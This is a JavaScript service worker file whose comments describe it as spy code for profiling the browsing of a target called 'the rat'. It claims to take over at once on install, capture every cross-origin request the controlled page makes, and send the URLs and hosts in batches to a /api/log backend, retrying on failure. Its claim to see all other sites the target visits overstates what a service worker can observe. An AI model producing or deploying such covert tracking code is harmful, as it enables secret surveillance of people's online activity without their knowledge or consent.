// public/sw.js - Service Worker: intercepts & logs every external request
// This builds a profile of the rat's browsing: which other sites/apps they touch.

const LOG_URL = '/api/log';

// Collect intercepted URLs; flush to backend in batches.
let intercepted = [];
let flushTimer = null;

function flush() {
    if (intercepted.length === 0) return;
    const batch = intercepted;
    intercepted = [];
    if (flushTimer) { clearTimeout(flushTimer); flushTimer = null; }

    // Report as a single payload, tagged sw:true so you can tell them apart
    // from the main spy payload in your dashboard.
    fetch(LOG_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            sw: true,
            intercepted: batch,
            count: batch.length,
            timestamp: Date.now()
        })
    }).catch(() => {
        // Backend unreachable — keep the batch so we retry.
        intercepted = batch.concat(intercepted);
        scheduleFlush();
    });
}

function scheduleFlush() {
    if (!flushTimer) {
        flushTimer = setTimeout(flush, 2500);
    }
}

// --- Install: activate immediately so it starts intercepting right away ---
self.addEventListener('install', (e) => {
    e.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (e) => {
    e.waitUntil(self.clients.claim());
});

// --- Fetch: intercept every request the page makes ---
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Only care about EXTERNAL requests (other sites/apps the rat touches).
    // Skip our own backend + same-origin so we don't log ourselves.
    if (url.origin === self.location.origin) return;

    // Log what they're fetching: type + full URL.
    intercepted.push({
        type: event.request.destination, // 'image', 'script', 'style', 'document', 'font', etc.
        url: url.href,
        host: url.hostname
    });

    scheduleFlush();
});